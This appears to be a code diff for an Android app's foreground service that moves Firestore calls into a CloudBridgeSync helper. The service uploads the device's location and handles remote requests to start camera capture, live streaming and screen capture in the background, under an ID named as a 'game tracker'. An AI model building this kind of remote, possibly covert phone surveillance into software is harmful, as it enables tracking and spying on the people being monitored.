@@ -182,26 +182,19 @@ class ForegroundService : Service() {
         val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
         val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return
 
-        try {
-            val firestore = FirebaseFirestore.getInstance()
-            val updates = mapOf<String, Any>(
-                "latitude" to location.latitude,
-                "longitude" to location.longitude,
-                "accuracy" to location.accuracy.toDouble(),
-                "lastLocationTime" to System.currentTimeMillis()
-            )
-            firestore.collection("devices").document(deviceId).update(updates)
+        CloudBridgeSync.updateDeviceLocation(
+            deviceId = deviceId,
+            latitude = location.latitude,
+            longitude = location.longitude,
+            accuracy = location.accuracy.toDouble(),
+            timestamp = System.currentTimeMillis()
+        )
 
-            if (!requestId.isNullOrEmpty()) {
-                firestore.collection("screenshot_requests").document(requestId).update(
-                    mapOf(
-                        "status" to "completed",
-                        "completedAt" to FieldValue.serverTimestamp()
-                    )
-                )
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
+        if (!requestId.isNullOrEmpty()) {
+            CloudBridgeSync.updateRequestStatus(
+                requestId = requestId,
+                status = "completed"
+            )
         }
     }
 
@@ -278,13 +271,11 @@ class ForegroundService : Service() {
                                         }
                                     } catch (e: Throwable) {
                                         Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
-                                        firestore.collection("screenshot_requests").document(requestId).update(
-                                            mapOf(
-                                                "status" to "failed",
-                                                "error" to "Service start disallowed",
-                                                "failureReason" to "OS disallowed background camera start: ${e.message}",
-                                                "completedAt" to FieldValue.serverTimestamp()
-                                            )
+                                        CloudBridgeSync.updateRequestStatus(
+                                            requestId = requestId,
+                                            status = "failed",
+                                            error = "Service start disallowed",
+                                            failureReason = "OS disallowed background camera start: ${e.message}"
                                         )
                                     }
                                 }
@@ -308,13 +299,11 @@ class ForegroundService : Service() {
                                         }
                                     } catch (e: Throwable) {
                                         Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
-                                        firestore.collection("screenshot_requests").document(requestId).update(
-                                            mapOf(
-                                                "status" to "failed",
-                                                "error" to "Stream start disallowed",
-                                                "failureReason" to "OS disallowed background stream start: ${e.message}",
-                                                "completedAt" to FieldValue.serverTimestamp()
-                                            )
+                                        CloudBridgeSync.updateRequestStatus(
+                                            requestId = requestId,
+                                            status = "failed",
+                                            error = "Stream start disallowed",
+                                            failureReason = "OS disallowed background stream start: ${e.message}"
                                         )
                                     }
                                 }
@@ -336,13 +325,11 @@ class ForegroundService : Service() {
                                         }
                                     } catch (e: Throwable) {
                                         Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
-                                        firestore.collection("screenshot_requests").document(requestId).update(
-                                            mapOf(
-                                                "status" to "failed",
-                                                "error" to "Screen capture start disallowed",
-                                                "failureReason" to "OS disallowed background capture start: ${e.message}",
-                                                "completedAt" to FieldValue.serverTimestamp()
-                                            )
+                                        CloudBridgeSync.updateRequestStatus(
+                                            requestId = requestId,
+                                            status = "failed",
+                                            error = "Screen capture start disallowed",
+                                            failureReason = "OS disallowed background capture start: ${e.message}"
                                         )
                                     }
                                 }
